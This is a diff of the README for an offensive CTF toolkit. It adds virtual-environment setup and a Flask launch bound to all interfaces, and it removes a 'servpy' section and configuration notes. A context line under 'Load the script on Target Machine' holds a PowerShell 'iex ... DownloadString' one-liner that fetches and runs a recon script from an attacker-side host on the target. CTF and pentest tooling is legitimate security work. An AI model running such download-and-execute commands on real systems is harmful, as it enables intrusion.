@@ -18,7 +18,10 @@ A set of tools that can be used individually or by web interface to help resolve
 ```bash
 git clone https://github.com/KermitPurple96/CTF-toolkit
 cd CTF-toolkit
+python3 -m venv .venv
+source .venv/bin/activate
 pip install pwn flask netifaces watchdog
+flask run --host=0.0.0.0 --port=5002 --no-debugger --no-reload
 ```
 ## Usage
 
@@ -39,14 +42,8 @@ listener <port>
 ```
 ![image](https://github.com/user-attachments/assets/9863b3e7-6d33-4ce4-8974-f2a598920f9c)
 
-3. Servpy
-```bash
-servpy
-```
-![image](https://github.com/user-attachments/assets/99d3721d-713d-4c79-a81f-30808ecdd0b7)
 
-
-4. Load the script on Target Machine
+3. Load the script on Target Machine
 
 For Linux
 ```bash
@@ -120,8 +117,3 @@ PS> iex ((New-Object System.Net.WebClient).DownloadString('http://10.10.10.10/re
 
 ```
 
-
-## Configuration
-
-- On httpTempServ.py add your own into SHORTCUTS dictionary, add your own aliases pointing the file path to quickly access.
-- Make sure that the aliases for recon.sh and recon.ps1 point to the correct path in your file system.
